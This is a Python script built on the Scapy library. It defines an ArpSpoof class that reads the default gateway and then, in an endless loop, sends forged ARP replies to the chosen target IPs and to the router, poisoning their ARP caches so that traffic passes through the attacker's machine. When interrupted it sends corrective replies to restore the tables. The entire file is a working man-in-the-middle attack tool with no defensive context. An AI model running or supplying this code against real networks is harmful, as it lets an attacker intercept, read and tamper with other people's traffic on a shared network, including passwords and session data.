from scapy.all import *
import time
from itertools import cycle
from scapy.layers.l2 import getmacbyip, ARP


class ArpSpoof:

    def spoof(self, target_ip, router_ip):
        target_mac = getmacbyip(target_ip)
        pkt = ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=router_ip)
        send(pkt, verbose=False)

    def restore_arp_table(self, dst_ip, src_ip):
        dst_mac = getmacbyip(dst_ip)
        src_mac = getmacbyip(src_ip)
        pkt = ARP(op=2, pdst=dst_ip, hwdst=dst_mac, psrc=src_ip, hwsrc=src_mac)
        send(pkt, count=4, verbose=False)

    def execute_arp_spoof(self, target_ip):
        cycle_ip = cycle(target_ip)
        router_ip = conf.route.route("0.0.0.0")[2]
        if not cycle_ip:
            print("[-] PLEASE PROVIDE THE TARGET'S IP")
        if router_ip == "0.0.0.0":
            print("[-] PLEASE CONNECT TO THE INTERNET")
        try:
            pkt_count = 0
            while True:
                for target_ip in cycle_ip:
                    self.spoof(target_ip, router_ip)
                    self.spoof(router_ip, target_ip)
                    pkt_count += 2
                    print("\r[+] Packet sent >> " + str(pkt_count), end="")
                    time.sleep(1)
        except KeyboardInterrupt:
            print("\n[-] Detected CTRL+C .....UPDATING ARP TABLE .....PLEASE WAIT :)")
            self.restore_arp_table(target_ip, router_ip)
            self.restore_arp_table(router_ip, target_ip)





